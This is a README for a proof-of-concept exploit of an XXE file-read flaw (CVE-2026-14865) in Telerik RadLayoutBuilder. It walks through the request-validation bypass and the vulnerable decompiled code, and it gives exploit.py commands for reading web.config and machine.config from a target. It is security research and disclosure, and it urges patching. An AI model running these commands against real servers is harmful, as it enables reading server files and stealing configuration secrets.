# RadLayoutBuilder XXE File Read

Proof-of-concept for the XXE vulnerability in RadLayoutBuilder's client state
(CVE-2026-14865) in Telerik UI for ASP.NET AJAX, fixed in 2026.2.708.

`LayoutBuilder.LoadClientState()` passes the `TableHtml` field from the
`_ClientState` hidden input through `ContentEncoder.Decode()` and then directly
into `XmlDocument.LoadXml()` without setting `XmlResolver` to null. The
`_ClientState` field has no MAC, so any value can be submitted.

The `ContentEncoder` percent-encoding scheme lets DOCTYPE and ENTITY
declarations bypass ASP.NET request validation, because the literal `<` and `>`
characters only appear after the server decodes the `%3c` and `%3e` sequences.

On targets where `httpRuntime targetFramework` is absent or below 4.5.2, the
default `XmlResolver` resolves external entities, allowing arbitrary file read.
On 4.5.2 and above, external entity resolution is disabled by default and the
vulnerability only causes denial of service through entity expansion (billion
laughs).

## Prerequisites

- A page rendering `<telerik:RadLayoutBuilder />`
- `httpRuntime targetFramework` absent or below 4.5.2 for file read
  (DoS works regardless)
- Python 3.8+
- No external dependencies (uses only `urllib`)

## Usage

```bash
pip install -r requirements.txt

# Read web.config (default target file)
python3 exploit.py http://target:8080 \
    --page /radlayoutbuilder.aspx

# Read machine.config
python3 exploit.py http://target:8080 \
    --file 'c:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config'

# Save the output to a local file
python3 exploit.py http://target:8080 \
    --file 'c:/inetpub/wwwroot/web.config' \
    --output web.config

# Route through Burp
python3 exploit.py http://target:8080 \
    --page /radlayoutbuilder.aspx \
    --proxy http://127.0.0.1:8080
```

### Flags

| Flag | Default | Purpose |
|---|---|---|
| `base` (positional) | required | Target base URL |
| `--page` | `/radlayoutbuilder.aspx` | RadLayoutBuilder page path |
| `--file` | `c:/inetpub/wwwroot/web.config` | File to read on the server |
| `--control-id` | `LayoutBuilder1` | RadLayoutBuilder control ID |
| `--output` / `-o` | | Save file content to a local file |
| `--proxy` | | HTTP proxy URL |
| `-v` | | Verbose output |

## Attack path

```
POST /radlayoutbuilder.aspx  (LayoutBuilder1_ClientState = forged JSON)
    |
    v
RadWebControl.LoadPostData()
  -> postCollection["LayoutBuilder1_ClientState"]
  -> new JavaScriptSerializer().DeserializeObject(text)     (no MAC, no signature)
  -> LoadClientState(clientState)                           (virtual, dispatches to LayoutBuilder)
    |
    v
LayoutBuilder.LoadClientState()
  -> ContentEncoder.Decode((string)clientState["TableHtml"])
    -> replaces %3c -> <, %3e -> >, %21 -> !, etc.         (request validation already passed)
  -> this.TableHtml = decoded string
  -> LoadTableHtmlXml()
    |
    v
LayoutBuilder.TableHtmlXml (property getter)
  -> _tableHtmlXml = new XmlDocument()                      (XmlResolver is NOT set to null)
  -> _tableHtmlXml.LoadXml(TableHtml)                       (parses attacker-controlled XML)
    -> .NET resolves DOCTYPE external entities               (on targetFramework < 4.5.2)
    -> file:///c:/inetpub/wwwroot/web.config is fetched
  -> entity content lands in <td> node text
    |
    v
LoadTableHtmlXml()
  -> SelectNodes("table") / SelectNodes("thead/tr|tbody/tr|tr") / SelectNodes("th|td")
  -> layoutBuilderCell.Content = item3.InnerText            (file content stored in cell)
    |
    v
GetLayoutTableHTML()                                        (during SaveClientState / render)
  -> htmlTextWriter.Write(layoutBuilderCell.Content)        (file content rendered into response)
```

The `_ClientState` hidden field has no MAC or server-side integrity check. `RadWebControl.LoadPostData()` deserialises it with `JavaScriptSerializer` and passes the resulting dictionary straight to the virtual `LoadClientState()` method. `ContentEncoder.Decode()` converts the percent-encoded sequences back to literal characters after ASP.NET request validation has already inspected the raw form value, so the `<!DOCTYPE>` and `<!ENTITY>` declarations are never seen by the validator.

---

## ContentEncoder bypass

ASP.NET request validation rejects form values containing literal `<` characters. Telerik's `ContentEncoder` works around this for legitimate use by percent-encoding special characters on the client side before submission. The server calls `ContentEncoder.Decode()` to reverse the encoding before processing.

An attacker uses the same encoding to smuggle XML declarations past request validation. The `<!DOCTYPE` sequence becomes `%3c%21DOCTYPE` after encoding `<` and `!`. Request validation sees only percent-encoded tokens and passes them through.

From `ContentEncoder.cs` (v2026.2.519):

```csharp
public class ContentEncoder
{
    private static readonly char[] characters = new char[26]
    {
        '%', '<', '>', '!', '"', '#', '$', '&', '\'', '(',
        ')', ',', ':', ';', '=', '?', '[', '\\', ']', '^',
        '`', '{', '|', '}', '~', '+'
    };

    private static readonly string[] percentFormattedStrings = new string[26]
    {
        "%25", "%3c", "%3e", "%21", "%22", "%23", "%24", "%26", "%27", "%28",
        "%29", "%2c", "%3a", "%3b", "%3d", "%3f", "%5b", "%5c", "%5d", "%5e",
        "%60", "%7b", "%7c", "%7d", "%7e", "%2b"
    };

    public static string Decode(string text)
    {
        if (!string.IsNullOrEmpty(text))
        {
            for (int num = characters.Length - 1; num >= 0; num--)
            {
                text = text.Replace(percentFormattedStrings[num], characters[num].ToString());
            }
        }
        return text;
    }
}
```

`Decode()` iterates the substitution table in reverse order, so `%25` for `%` is decoded last, after all other `%XX` sequences have already been restored. Because this runs server-side after request validation, the restored `<`, `>`, and `!` characters are never inspected.

---

## XmlDocument entity resolution

`LayoutBuilder.LoadClientState()` sets `this.TableHtml` to the decoded string, then calls `LoadTableHtmlXml()`. The `TableHtmlXml` property getter creates a new `XmlDocument` and calls `LoadXml()` on the attacker-controlled value.

From `LayoutBuilder.cs` (v2026.2.519):

```csharp
protected override void LoadClientState(Dictionary<string, object> clientState)
{
    base.LoadClientState(clientState);
    TableHtml = ContentEncoder.Decode((string)clientState["TableHtml"]);
    LoadTableHtmlXml();
}

public XmlDocument TableHtmlXml
{
    get
    {
        _tableHtmlXml = new XmlDocument();
        if (!string.IsNullOrEmpty(TableHtml))
        {
            _tableHtmlXml.LoadXml(TableHtml);
        }
        return _tableHtmlXml;
    }
}
```

The `XmlDocument` constructor uses default settings. It never sets `XmlResolver = null`. On .NET Framework versions where `httpRuntime targetFramework` is absent or below 4.5.2, the default `XmlResolver` is `XmlUrlResolver`, which resolves external entities including `file://` URIs. This allows the attacker's `<!ENTITY xxe SYSTEM "file:///c:/path">` declaration to read arbitrary files from the server.

On .NET Framework 4.5.2 and above (with the corresponding `targetFramework` set), the default `XmlResolver` is null, blocking external entity resolution. In that configuration, entity expansion attacks (billion laughs) still work because they do not require an external resolver.

---

## How it works

1. GET the RadLayoutBuilder page to extract `__VIEWSTATE`, `__EVENTVALIDATION`,
   and `__VIEWSTATEGENERATOR`.
2. Build a `_ClientState` JSON value whose `TableHtml` field, after
   `ContentEncoder.Decode()`, becomes an XXE payload with an external entity
   pointing at the target file.
3. POST the forged `_ClientState`. The server calls `XmlDocument.LoadXml()`,
   resolves the external entity, and renders the file content into the response.

## Expected output

```
$ python3 exploit.py http://target:8080 --page /radlayoutbuilder.aspx -v

╔══════════════════════════════════════════════════════╗
║  RadLayoutBuilder XXE File Read                      ║
║  CVE-2026-14865                                      ║
║  Tanto Security - https://tantosec.com               ║
╚══════════════════════════════════════════════════════╝

[*] target: http://target:8080/radlayoutbuilder.aspx
[*] file to read: c:/inetpub/wwwroot/web.config
[*] fetching page to extract form state...
[*] __VIEWSTATE length: 1284
[*] _ClientState length: 612
[*] sending exploit POST...
[*] HTTP 200 (28451 bytes)

[+] file content read (3841 chars):
============================================================
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <appSettings>
    <add key="Telerik.Web.UI.DialogParametersEncryptionKey" value="..." />
    ...
  </appSettings>
</configuration>
============================================================
```

If the target's `httpRuntime targetFramework` is 4.5.2 or above, entity resolution is disabled by default and the output marker will not appear. The exploit prints `[-] could not find output marker in response` in that case.

## Files

| File | Description |
|---|---|
| `exploit.py` | Builds the encoded XXE payload and extracts the file content from the response. |
| `requirements.txt` | Python dependencies (stdlib only). |
| `Dockerfile` | Python 3.12-slim container. |

## Disclaimer

The exploits and proof-of-concept code in this repository are published for
security research, defensive use, and authorised testing. All of the
vulnerabilities demonstrated here are already patched; we strongly recommend
updating Telerik UI for ASP.NET AJAX to the latest version.

## License

Released under the [MIT License](../../LICENSE).
